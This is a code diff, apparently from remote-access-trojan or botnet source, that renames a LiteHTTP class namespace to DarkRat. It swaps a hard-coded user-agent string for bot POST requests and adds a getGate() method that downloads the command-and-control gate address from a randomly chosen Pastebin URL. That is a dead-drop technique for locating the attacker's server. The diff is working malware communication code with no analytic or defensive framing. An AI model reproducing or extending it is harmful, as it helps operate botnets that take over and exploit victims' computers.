@@ -4,7 +4,7 @@ using System.Net;
 using System.Text;
 using System.Security.Cryptography;
 
-namespace LiteHTTP.Classes
+namespace DarkRat.Classes
 {
     class Communication
     {
@@ -18,7 +18,7 @@ namespace LiteHTTP.Classes
                 byte[] param = Encoding.UTF8.GetBytes(parameters);
                 WebRequest req = WebRequest.Create(url);
                 req.Method = "POST";
-                ((HttpWebRequest)req).UserAgent = "E9BC3BD76216AFA560BFB5ACAF5731A3";
+                ((HttpWebRequest)req).UserAgent = "pZBsGN4sqXDtFoPzNGbh";
                 req.ContentType = "application/x-www-form-urlencoded";
                 req.ContentLength = param.Length;
                 Stream st = req.GetRequestStream();
@@ -102,5 +102,27 @@ namespace LiteHTTP.Classes
             }
             catch (Exception ex) { return ex.Message; }
         }
+
+
+        public static string getGate()
+        {
+
+
+
+            Random random = new Random();
+            int start2 = random.Next(0, Settings.PastebinUrl.Length);
+            WebRequest request = WebRequest.Create(Settings.PastebinUrl[start2]);
+            request.Credentials = CredentialCache.DefaultCredentials;
+            WebResponse response = request.GetResponse();
+            Stream dataStream = response.GetResponseStream();
+            StreamReader reader = new StreamReader(dataStream);
+            string responseFromServer = reader.ReadToEnd();
+            reader.Close();
+            response.Close();
+            //Console.WriteLine(responseFromServer);
+            return responseFromServer;
+        }
+
     }
 }
+
